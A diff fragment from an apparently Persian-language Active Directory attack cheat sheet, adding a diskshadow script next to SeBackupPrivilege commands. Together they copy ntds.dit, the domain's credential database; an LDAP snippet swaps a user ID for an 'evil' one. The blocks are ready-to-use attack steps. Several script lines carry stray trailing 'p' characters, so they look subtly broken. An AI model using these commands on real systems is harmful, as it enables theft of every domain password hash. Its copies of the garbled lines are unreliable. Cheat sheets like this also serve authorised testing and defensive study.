@@ -402,12 +402,24 @@ uidNumber: CURRENT USER ID
 replace: EVIL USER ID
 gidNumber: CURRENT GROUP ID
 ```
+
 ### کپی از ndts با استفاده از مجوز SeBackupPrivilege 
 
 ```text
 import-module .\SeBackupPrivilegeUtils.dll
 import-module .\SeBackupPrivilegeCmdLets.dll
 Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit
+```
+
+### خواندن فایل ها بدون احراز هویت با diskshadow
+
+```text
+1. priv.txt contain
+SET CONTEXT PERSISTENT NOWRITERSp
+add volume c: alias 0xprashantp
+createp
+expose %0xprashant% z:p
+2. exec with diskshadow /s priv.txt
 ```
 
 
